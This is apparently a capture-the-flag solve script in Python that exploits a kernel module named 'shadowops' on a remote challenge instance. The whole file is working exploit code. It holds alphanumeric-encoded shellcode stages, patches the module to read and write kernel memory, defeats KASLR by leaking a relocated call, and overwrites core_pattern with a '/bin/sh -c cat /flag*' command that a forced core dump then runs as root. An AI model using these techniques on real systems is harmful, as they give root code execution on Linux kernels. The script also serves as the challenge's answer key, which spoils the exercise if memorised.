#!/usr/bin/env python3
import json
import re
import socket
import ssl
import struct
import sys
import time
from pathlib import Path


ROOT = Path(__file__).resolve().parent
ALPHA3_RAX_DECODER = bytes.fromhex(
    "50683036363654593131333158683333333331316b3133586a695631314863315a"
    "585966315471494866396b44715730324471583044314875334d"
)
ALNUM = b"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
STAGE_SIZE = 96
MODULE_LEAK_MARKER = b"MODLEAK!"

BASE_COPY_FROM_USER = 0xFFFFFFFF81371700
BASE_CORE_PATTERN = 0xFFFFFFFF820674E0
MODULE_USED_OFFSET = 0xCD0
MODULE_WRITE_OFFSET = 0x30


def load_endpoint() -> dict:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    return endpoint


def alpha3_encode_rax(raw: bytes) -> bytes:
    if b"\0" in raw:
        raise ValueError("ALPHA3 input must be NUL-free")
    encoded = bytearray(ALPHA3_RAX_DECODER[-2:])
    for index, value in enumerate(raw + b"\0", start=1):
        wanted = value ^ encoded[index]
        for left in ALNUM:
            right = ((left * 0x30) & 0xFF) ^ wanted
            if right in ALNUM:
                encoded.extend((left, right))
                break
        else:
            raise ValueError(f"cannot encode byte {value:#x}")
    result = ALPHA3_RAX_DECODER[:-2] + encoded
    if not result.isalnum():
        raise ValueError("encoder produced a non-alphanumeric byte")
    return result


def rel32(source_after: int, target: int) -> bytes:
    return struct.pack("<i", target - source_after)


def build_leak_stage(module_base: int) -> bytes:
    code = bytearray()
    fixups: list[tuple[int, str, int]] = []

    def lea_rsi(label: str, addend: int = 0) -> None:
        code.extend(b"\x48\x8d\x35")
        fixups.append((len(code), label, addend))
        code.extend(b"\0" * 4)

    # count==8 reads one qword; count==16 performs the original write.
    replacement = bytes.fromhex(
        "83fa08740d488b06488b4e0848890889d0c3488b06488b0048890689d0c3"
    ).ljust(32, b"\x90")
    used = module_base + MODULE_USED_OFFSET
    requests: list[tuple[int, int]] = []
    for offset in range(0, len(replacement), 8):
        requests.append((module_base + offset,
                         struct.unpack_from("<Q", replacement, offset)[0]))
        requests.append((used, 0))
    entry_patch = int.from_bytes(b"\xe9\xcb\xff\xff\xff\x90\x90\x90", "little")
    requests.append((module_base + MODULE_WRITE_OFFSET, entry_patch))

    for index in range(len(requests)):
        code += b"\xb8\x01\x00\x00\x00\xbf\x03\x00\x00\x00"
        lea_rsi("requests", index * 16)
        code += b"\xba\x10\x00\x00\x00\x0f\x05"

    # Read the relocated call instruction at shadowops_write+0x57.
    code += b"\xb8\x01\x00\x00\x00\xbf\x03\x00\x00\x00"
    lea_rsi("read_request")
    code += b"\xba\x08\x00\x00\x00\x0f\x05"

    code += b"\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00"
    lea_rsi("marker")
    code += b"\xba\x08\x00\x00\x00\x0f\x05"
    code += b"\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00"
    lea_rsi("read_request")
    code += b"\xba\x08\x00\x00\x00\x0f\x05"

    # Read the final stage exactly, despite TCP fragmentation.
    code += b"\x31\xed\x31\xc0\x31\xff"
    code += b"\x49\x8d\xb0\x00\x05\x00\x00\x48\x01\xee"
    code += b"\xba\x00\x04\x00\x00\x29\xea\x0f\x05\x48\x01\xc5"
    code += b"\x48\x81\xfd\x00\x04\x00\x00\x72\xdd"
    code += b"\x49\x8d\xb0\x00\x05\x00\x00\xff\xe6"

    labels = {"requests": len(code)}
    for request in requests:
        code += struct.pack("<QQ", *request)
    labels["read_request"] = len(code)
    code += struct.pack("<QQ", module_base + MODULE_WRITE_OFFSET + 0x27, 0)
    labels["marker"] = len(code)
    code += MODULE_LEAK_MARKER
    for offset, label, addend in fixups:
        code[offset : offset + 4] = rel32(offset + 4, labels[label] + addend)
    return bytes(code)


def build_exploit_stage(slide: int) -> bytes:
    code = bytearray()
    fixups: list[tuple[int, str, int]] = []

    def lea_rsi(label: str, addend: int = 0) -> None:
        code.extend(b"\x48\x8d\x35")
        fixups.append((len(code), label, addend))
        code.extend(b"\0" * 4)

    command = b"|/bin/sh -c cat${IFS}/flag*${IFS}>/dev/console\0"
    command = command.ljust((len(command) + 7) & ~7, b"\0")
    requests: list[tuple[int, int]] = []
    for offset in range(0, len(command), 8):
        requests.append((BASE_CORE_PATTERN + slide + offset,
                         struct.unpack_from("<Q", command, offset)[0]))

    for index in range(len(requests)):
        code += b"\xb8\x01\x00\x00\x00"       # write(3, request, 16)
        code += b"\xbf\x03\x00\x00\x00"
        lea_rsi("requests", index * 16)
        code += b"\xba\x10\x00\x00\x00\x0f\x05"

    code += b"\x31\xc0\x48\x8b\x00"          # trigger a piped core dump

    labels = {"requests": len(code)}
    for target, value in requests:
        code += struct.pack("<QQ", target, value)

    for offset, label, addend in fixups:
        code[offset : offset + 4] = rel32(offset + 4, labels[label] + addend)
    return bytes(code)


def recv_until(sock: socket.socket, marker: bytes, timeout: float = 30.0) -> bytes:
    sock.settimeout(timeout)
    data = bytearray()
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError(
                f"connection closed before {marker!r}; tail={bytes(data[-2000:])!r}"
            )
        data.extend(chunk)
    return bytes(data)


def solve() -> bytes:
    endpoint = load_endpoint()
    raw = socket.create_connection((endpoint["host"], endpoint["port"]), timeout=15)
    if endpoint["protocol"] == "tls":
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(raw, server_hostname=endpoint["host"])
    elif endpoint["protocol"] == "tcp":
        sock = raw
    else:
        raw.close()
        raise ValueError(f"unsupported protocol: {endpoint['protocol']}")
    with sock:
        recv_until(sock, b"CMD> ", timeout=40)
        sock.sendall(b"1\n")
        recv_until(sock, b"TARGET> ")
        sock.sendall(b"/proc/modules\n")
        leak = recv_until(sock, b"CMD> ")
        match = re.search(rb"shadowops\s+\d+.*?Live\s+(?:0x)?([0-9a-f]{16})", leak)
        if not match:
            raise RuntimeError("failed to parse shadowops module base")
        module_base = int(match.group(1), 16)

        raw_stage1 = b"\x31\xc0\x31\xff\x49\x8d\x70\x7a\x0f\x05\xff\xe6"
        stage1 = alpha3_encode_rax(raw_stage1)
        if len(stage1) > STAGE_SIZE:
            raise RuntimeError("alphanumeric stage 1 is too large")
        stage1 = stage1.ljust(STAGE_SIZE, b"A")

        stage2 = (
            b"\x31\xed"                    # read exactly 0x200 bytes
            b"\x31\xc0\x31\xff"
            b"\x49\x8d\xb0\x00\x02\x00\x00"
            b"\x48\x01\xee"
            b"\xba\x00\x02\x00\x00\x29\xea"
            b"\x0f\x05\x48\x01\xc5"
            b"\x48\x81\xfd\x00\x02\x00\x00\x72\xdd"
            b"\x49\x8d\xb0\x00\x02\x00\x00\xff\xe6"
        ).ljust(STAGE_SIZE, b"\x90")
        leak_stage = build_leak_stage(module_base)
        if len(leak_stage) > 0x200:
            raise RuntimeError("module leak stage is too large")
        leak_stage = leak_stage.ljust(0x200, b"\x90")

        sock.sendall(b"2\n")
        recv_until(sock, b"PAYLOAD> ")
        # Coalesce the first two fixed-size stages.  The challenge's initial
        # read consumes exactly the first 96 bytes, leaving stage 2 ready for
        # the tiny alphanumeric loader's single read.
        sock.sendall(stage1 + stage2)
        time.sleep(0.05)
        sock.sendall(leak_stage)
        leak_output = recv_until(sock, MODULE_LEAK_MARKER, timeout=10)
        relocated = leak_output.split(MODULE_LEAK_MARKER, 1)[1]
        while len(relocated) < 8:
            relocated += sock.recv(8 - len(relocated))
        call = relocated[:8]
        if call[0] != 0xE8:
            raise RuntimeError(f"unexpected module call bytes: {call.hex()}")
        displacement = struct.unpack("<i", call[1:5])[0]
        copy_from_user = module_base + MODULE_WRITE_OFFSET + 0x2C + displacement
        slide = copy_from_user - BASE_COPY_FROM_USER
        stage4 = build_exploit_stage(slide)
        if len(stage4) > 0x400:
            raise RuntimeError("exploit stage is too large")
        sock.sendall(stage4.ljust(0x400, b"\x90"))

        sock.settimeout(20)
        transcript = bytearray()
        while True:
            try:
                chunk = sock.recv(4096)
            except (socket.timeout, ConnectionResetError):
                break
            if not chunk:
                break
            transcript.extend(chunk)
            match = re.search(rb"(?:pwnsec|flag)\{[^}\r\n]+\}", transcript)
            if match:
                return match.group(0)
        tail = bytes(transcript[-2000:])
        raise RuntimeError(f"flag was not observed in the target output; tail={tail!r}")


def main() -> None:
    failures = []
    for _ in range(3):
        try:
            sys.stdout.buffer.write(solve())
            return
        except Exception as exc:
            failures.append(str(exc))
    print(f"solve failed after 3 attempts: {failures[-1]}", file=sys.stderr)
    raise SystemExit(1)


if __name__ == "__main__":
    main()
